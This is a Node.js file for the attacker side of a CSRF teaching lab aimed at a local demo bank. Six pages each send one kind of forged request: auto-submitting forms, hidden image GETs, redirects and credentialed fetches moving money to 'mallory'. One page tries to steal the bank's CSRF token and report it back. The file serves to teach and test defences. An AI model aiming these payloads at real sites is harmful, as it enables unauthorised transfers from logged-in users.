// attacker-site.js
// The EVIL site. In this lab it is served from a different site than the bank
// (http://127.0.0.1:PORT, while the bank is http://localhost:PORT), or from a
// different PORT of the same host, to show what "same-site" means.
//
//   node attacker-site.js [port]            (default 4961)
//   then open  http://127.0.0.1:4961/form-post?bank=4960   in a browser where you are logged in to the bank
//
// Each page makes ONE kind of cross-site request to the bank. Query parameters:
//   bank=PORT   the bank's port (required)     to=mallory   amount=100   path=...  (where the request goes)
// The pages never read anything back unless they say so: that is the point of CSRF.
// The attacker does not need to see the response, only to get the request sent.

const express = require("express");

function createEvilSite() {
  const app = express();
  const reports = []; // what the token-reader page saw, reported back to this site

  app.get("/report", (req, res) => {
    reports.push({ ...req.query });
    res.status(204).end();
  });

  const ctx = (req) => ({
    bank: `http://localhost:${req.query.bank}`,
    to: req.query.to || "mallory",
    amount: req.query.amount || "100",
    path: req.query.path,
  });
  const html = (body) => `<!doctype html><html><body><p>Totally innocent cat pictures.</p>${body}</body></html>`;

  // 1. A form that submits itself. Top-level navigation, cookies attached unless SameSite says no.
  app.get("/form-post", (req, res) => {
    const c = ctx(req);
    res.send(html(`<form id="f" method="POST" action="${c.bank}${c.path || "/transfer"}">
<input name="to" value="${c.to}"><input name="amount" value="${c.amount}"></form><script>document.getElementById("f").submit()</script>`));
  });

  // 2. An image. The browser requests the "image" URL with a GET, and nobody sees a thing.
  app.get("/img-get", (req, res) => {
    const c = ctx(req);
    res.send(html(`<img src="${c.bank}/transfer?to=${c.to}&amount=${c.amount}" width="1" height="1">`));
  });

  // 3. A redirect to the bank's GET URL. A top-level navigation, which SameSite=Lax lets cookies through on.
  app.get("/nav-get", (req, res) => {
    const c = ctx(req);
    res.send(html(`<script>location = "${c.bank}/transfer?to=${c.to}&amount=${c.amount}"</script>`));
  });

  // 4. fetch() with a "simple" Content-Type (text/plain): no preflight, so the request is sent even though the reply is unreadable.
  app.get("/fetch-simple", (req, res) => {
    const c = ctx(req);
    res.send(html(`<script>
fetch("${c.bank}${c.path || "/api/transfer"}", { method: "POST", credentials: "include", mode: "no-cors",
  headers: { "Content-Type": "text/plain" }, body: JSON.stringify({ to: "${c.to}", amount: ${Number(c.amount)} }) });
</script>`));
  });

  // 5. fetch() with application/json and a custom header: not "simple", so the browser asks permission first (a preflight).
  app.get("/fetch-json", (req, res) => {
    const c = ctx(req);
    res.send(html(`<script>
fetch("${c.bank}/api/transfer", { method: "POST", credentials: "include",
  headers: { "Content-Type": "application/json", "X-Requested-With": "bank-ui" },
  body: JSON.stringify({ to: "${c.to}", amount: ${Number(c.amount)} }) }).catch(() => {});
</script>`));
  });

  // 6. Try to READ the bank's page (to steal a CSRF token), then use the token. Works only if the bank's CORS lets this origin read.
  app.get("/token-reader", (req, res) => {
    const c = ctx(req);
    res.send(html(`<script>
(async () => {
  const report = (step, data) => fetch("/report?" + new URLSearchParams({ step, ...data }));
  try {
    const page = await (await fetch("${c.bank}/account", { credentials: "include" })).text();
    const token = (page.match(/name="csrf-token" content="([^"]*)"/) || [])[1];
    await report("read", { readable: "yes", gotToken: String(Boolean(token)) });
    const headers = { "Content-Type": "application/json", "X-Requested-With": "bank-ui", "X-CSRF-Token": token || "" };
    const r = await fetch("${c.bank}/api/transfer", { method: "POST", credentials: "include", headers,
      body: JSON.stringify({ to: "${c.to}", amount: ${Number(c.amount)} }) });
    await report("transfer", { status: String(r.status) });
  } catch (e) {
    await report("read", { readable: "no", error: String(e).slice(0, 60) });
  }
})();
</script>`));
  });

  return { app, reports };
}

module.exports = { createEvilSite };

if (require.main === module) {
  const port = process.argv[2] || 4961;
  createEvilSite().app.listen(port, () => console.log(`evil site listening on http://127.0.0.1:${port}`));
}
